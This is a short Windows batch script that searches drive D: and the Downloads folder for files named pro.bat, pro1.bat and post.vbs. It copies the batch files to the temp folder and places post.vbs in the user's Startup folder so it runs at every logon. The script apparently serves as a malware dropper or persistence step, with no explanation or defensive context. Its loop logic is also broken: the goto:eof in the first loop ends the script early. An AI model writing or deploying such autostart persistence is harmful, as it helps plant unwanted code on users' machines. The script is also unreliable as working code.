@echo off
set "downloads_dir=%USERPROFILE%\Downloads"
set "temp_dir=%temp%"

for /R "D:\" %%i in (pro.bat) do (
    copy "%%i" "%temp_dir%"
    ping -n 1 127.0.0.1 > nul 
    goto:eof
)
for /R "%downloads_dir%" %%i in (pro1.bat) do (
    copy "%%i" "%temp_dir%"
    ping -n 1 127.0.0.1 > nul
    goto:eof
)
for /R "%downloads_dir%" %%i in (post.vbs) do (
    copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
    ping -n 1 127.0.0.1 > nul 
    goto:eof
)

